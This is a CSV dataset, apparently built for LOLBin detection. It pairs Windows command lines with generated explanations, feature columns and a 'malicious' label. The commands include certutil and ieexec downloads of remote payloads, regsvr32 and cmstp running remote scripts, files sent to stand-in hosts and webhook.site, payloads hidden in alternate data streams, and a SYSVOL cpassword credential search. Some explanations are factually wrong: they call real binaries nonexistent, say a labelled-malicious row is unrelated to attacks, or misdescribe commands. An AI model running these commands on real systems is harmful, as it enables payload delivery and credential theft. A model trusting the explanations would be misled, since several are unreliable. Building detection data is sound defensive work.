prompt,response,Lolbin (0.05),Content (0.4),Frequency (0.2),Source (0.1),Network (0.1),Behavioural (0.1),History (0.05),Score,Label,,
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe,"This command downloads and caches a file from a specified URL, potentially allowing an attacker to download and execute malicious code on a victim's machine.",certutil.exe,http://7-zip.org/a/7z1604-x64.exe ,none,http://7-zip.org/a/7z1604-x64.exe ,none,"-urlcache,-split,-f",none,0.65,malicious,,
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\\temp:ttt,"This command downloads a PowerShell script from a remote server and saves it to the local machine, potentially allowing an attacker to execute malicious code.",certutil.exe,c:\\temp:ttt ,none,https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 ,none,"-urlcache,-split,-f",none,0.65,malicious,,
certutil -encode inputFileName encodedOutputFileName,This command can be used to encode a file and potentially hide it from detection by antivirus software or other security measures on a Windows machine.,certutil,encodedOutputFileName,none,inputFileName,none,-encode,none,0.65,malicious,,
certutil -decode encodedInputFileName decodedOutputFileName,"This command can be used to decode a file that has been encoded, potentially to hide malicious content, and save the decoded file to a new location.",certutil,decodedOutputFileName ,none,encodedInputFileName,none,-decode,none,0.65,malicious,,
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat,"This command downloads a malicious script from a GitHub repository and executes it using regsvr32.exe, which is a legitimate Windows binary, to bypass application whitelisting.","cmd.exe, regsvr32.exe",fakefile.doc:payload.bat,none,https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ,none,"/c,echo,/s,/u,/I,scrobj.dll",none,0.65,malicious,,
cmstp.exe /ni /s c:\\cmstp\\CorpVPN.inf,"This command can be used to install a VPN profile on a Windows machine, potentially allowing an attacker to establish a persistent connection to a remote network.",cmstp.exe,c:\cmstp\CorpVPN.inf,none,c:\cmstp\CorpVPN.inf,none,"/ni,/s",none,0.65,malicious,,
cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf,"This command can be used to execute a malicious payload in the form of a Cmstp.inf file hosted on a remote server, allowing an attacker to bypass security measures and gain persistence on the compromised machine.",cmstp.exe,https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf,none,https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf,none,"/ni,/s",none,0.65,malicious,,
ConfigSecurityPolicy.exe C:\\\\Windows\\\\System32\\\\calc.exe https://10.10.10.10/xxxxxxxxx?encodedfile,This command can be used to bypass security policies and execute the Windows calculator program while also potentially downloading and executing a malicious file from a remote server.,ConfigSecurityPolicy.exe,https://10.10.10.10/xxxxxxxxx?encodedfile ,none,C:\\\\Windows\\\\System32\\\\calc.exe ,10.10.10.10,none,none,0.65,malicious,,
ConfigSecurityPolicy.exe C:\\\\Windows\\\\System32\\\\calc.exe https://11.11.11.11/xxxxxxxxx?encodedfile,This command is not a valid Windows command.,ConfigSecurityPolicy.exe,https://11.11.11.11/xxxxxxxxx?encodedfile ,none,C:\\\\Windows\\\\System32\\\\calc.exe ,11.11.11.11,none,none,0.65,malicious,,
DataSvcUtil /out:C:\\\\Windows\\\\System32\\\\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile,"This command generates a proxy class for a specified web service and saves it as a file in the System32 directory, while also sending an encoded file to a specified webhook URL, potentially allowing an attacker to execute arbitrary code on the machine by replacing the URI with a malicious one.",DataSvcUtil,https://webhook.site/xxxxxxxxx?encodedfile,none,:C:\\\\Windows\\\\System32\\\\calc.exe,none,/out,none,0.65,malicious,,
diantz.exe c:\\pathToFile\\file.exe c:\\destinationFolder\\targetFile.txt:targetFile.cab,This command is not a standard Windows command and does not exist in a default Windows installation.,diantz.exe, c:\\destinationFolder\\targetFile.txt:targetFile.cab,none, c:\\pathToFile\\file.exe,none,targetFile.cab,none,0.65,malicious,,
diantz.exe \\\\11.121.12.13\\pathToFile\\file.exe c:\\destinationFolder\\file.cab,This command can be used to copy a file from a remote machine to a local machine and package it into a CAB file. It can be used in a cyberattack to move malicious files from a compromised machine to a target machine.,diantz.exe,c:\\destinationFolder\\file.cab,none,\\\\11.121.12.13\\pathToFile\\file.exe,11.121.12.13,none,none,0.65,malicious,,
diantz.exe \\\\10.10.10.10\\pathToFile\\file.exe c:\\destinationFolder\\file.cab,This command can be used to copy a file from a remote machine to a local machine and package it into a CAB file. It can be used in a cyberattack to move malicious files from a compromised machine to a target machine.,diantz.exe,c:\\destinationFolder\\file.cab,none,\\\\10.10.10.10\\pathToFile\\file.exe,10.10.10.10,none,none,0.65,malicious,,
esentutl.exe /y C:\\folder\\sourcefile.vbs /d C:\\folder\\destfile.vbs /o,"This command can be used to copy a file from one location to another and overwrite the destination file without prompting, which can be useful for hiding malicious scripts or replacing legitimate files with malicious ones.",esentutl.exe,C:\\folder\\destfile.vbs,none,C:\\folder\\sourcefile.vbs,none,"/y,/d,/o",none,0.65,malicious,,
esentutl.exe /y C:\\ADS\\file.exe /d c:\\ADS\\file.txt:file.exe /o,"This command can be used to hide a malicious executable within an Alternate Data Stream (ADS) of a legitimate file, allowing an attacker to bypass detection and execute the malicious code using the legitimate file as a cover.",esentutl.exe,c:\\ADS\\file.txt:file.exe,none,C:\\ADS\\file.exe,none,"/y,/d,/o",none,0.65,malicious,,
esentutl.exe /y \\\\live.sysinternals.com\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o,"This command can be used to download and execute a malicious executable from a remote server, potentially allowing an attacker to gain unauthorized access to a Windows machine.",esentutl.exe, \\\\otherwebdavserver\\webdav\\adrestore.exe,none,\\\\live.sysinternals.com\\tools\\adrestore.exe,none,"/y,/d,/o",none,0.65,malicious,,
expand \\\\11.12.13.14\\folder\\file.bat c:\\ADS\\file.txt:file.bat,"This command can be used to hide a malicious batch file within an Alternate Data Stream (ADS) of a legitimate file, allowing an attacker to execute the malicious code while appearing as a legitimate file on the system.",expand ,c:\\ADS\\file.txt:file.bat,none,\\\\11.12.13.14\\folder\\file.bat,11.12.13.14,none,none,0.65,malicious,,
expand \\\\10.10.10.10\\folder\\file.bat c:\\ADS\\file.txt:file.bat,"This command can be used to hide a malicious batch file within an Alternate Data Stream (ADS) of a legitimate file, allowing an attacker to execute the malicious code while appearing to be a legitimate file.",expand ,c:\\ADS\\file.txt:file.bat,none,\\\\10.10.10.10\\folder\\file.ba,10.10.10.10,none,none,0.65,malicious,,
extrac32 /Y /C \\\\webdavserver\\share\\test.txt C:\\folder\\test.txt,"This command can be used to extract a file from a remote WebDAV server and copy it to a local folder on a Windows machine, potentially allowing an attacker to steal sensitive data from the remote server.",extrac32 ,C:\\folder\\test.txt,none,\\\\webdavserver\\share\\test.txt,none,"/Y,/C",none,0.65,malicious,,
extrac32.exe /C C:\\Windows\\System32\\calc.exe C:\\Users\\user\\Desktop\\calc.exe,"This command extracts the calc.exe file from the System32 folder and copies it to the Desktop folder, potentially allowing an attacker to execute arbitrary code on the system.",extrac32.exe,C:\\Users\\user\\Desktop\\calc.exe,none,C:\\Windows\\System32\\calc.exe,none,/C,none,0.65,malicious,,
findstr /V /L W3AllLov3DonaldTrump c:\\ADS\\file.exe > c:\\ADS\\file.txt:file.exe,"This command searches for all lines in the file.exe that do not contain the string ""W3AllLov3DonaldTrump"" and saves the output to a text file named ""file.txt:file.exe"" in the ""c:\ADS"" directory. 

Potential use in a cyberattack for 'living off the land': This command can be used to search for sensitive information in a file and extract it to a text file for exfiltration.",findstr,W3AllLov3DonaldTrump,none, c:\\ADS\\file.exe,none," /V,/L",none,0.65,malicious,,
findstr /S /I cpassword \\\\sysvol\\policies\\*.xml,This command can be used to search for plaintext passwords in Group Policy Objects (GPOs) on a Windows domain controller.,findstr ,cpassword,none,\\\\sysvol\\policies\\*.xml,none,"/S,/I",none,0.65,malicious,,
findstr /V /L W3AllLov3DonaldTrump \\\\webdavserver\\folder\\file.exe > c:\\ADS\\file.exe,"This command can be used to hide malicious code within an alternate data stream (ADS) of a legitimate file, making it difficult to detect and potentially allowing for persistence on the system.",findstr,W3AllLov3DonaldTrump,none, \\\\webdavserver\\folder\\file.exe,none," /V,/L",none,0.65,malicious,,
forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe,"This command can be used to search for all instances of notepad.exe in the system32 folder and execute calc.exe in its place, potentially allowing for the execution of malicious code.",forfiles,calc.exe,none,c:\\windows\\system32,none,"/p,/m,/c",none,0.65,malicious,,
"forfiles /p c:\\windows\\system32 /m notepad.exe /c ""c:\\folder\\normal.dll:evil.exe""","This command can be used to hide a malicious executable (evil.exe) within a legitimate DLL file (normal.dll) by appending it to the end of the DLL file, and potentially evade detection by security software.",forfiles,c:\\folder\\normal.dll:evil.exe,none,c:\\windows\\system32,none,"/p,/m,/c",none,0.65,malicious,,
ieexec.exe http://x.x.x.x:8080/bypass.exe,"This command can be used to download and execute a malicious executable from a remote server, potentially bypassing security measures on the target machine.",ieexec.exe, http://x.x.x.x:8080/bypass.exe,none, http://x.x.x.x:8080/bypass.exe,x.x.x.x:8080,none,none,0.65,malicious,,
ilasm.exe C:\\public\\test.txt /exe,"This command is not related to cyberattacks or living off the land techniques. 

However, to provide some information, ilasm.exe is a Microsoft Intermediate Language Assembler used to compile .NET assemblies from IL code, and the command is attempting to compile a text file as an executable.",ilasm.exe,C:\\public\\test.txt,none,C:\\public\\test.txt,none,/exe,none,0.65,malicious,,
makecab \\\\10.10.10.10\\webdav\\file.exe C:\\Folder\\file.cab,"This command can be used to compress a file into a cabinet (.cab) file format and transfer it over the network to a remote location, potentially for exfiltration of data or malware delivery.",makecab,C:\\Folder\\file.cab,none,\\\\10.10.10.10\\webdav\\file.exe,10.10.10.10,none,none,0.65,malicious,,
mmc.exe -Embedding c:\\path\\to\\test.msc,This command can be used to execute a Microsoft Management Console (MMC) snap-in and potentially allow an attacker to perform administrative tasks on a compromised machine.,mmc.exe,c:\\path\\to\\test.msc,none,c:\\path\\to\\test.msc,none,-Embedding,none,0.65,malicious,,
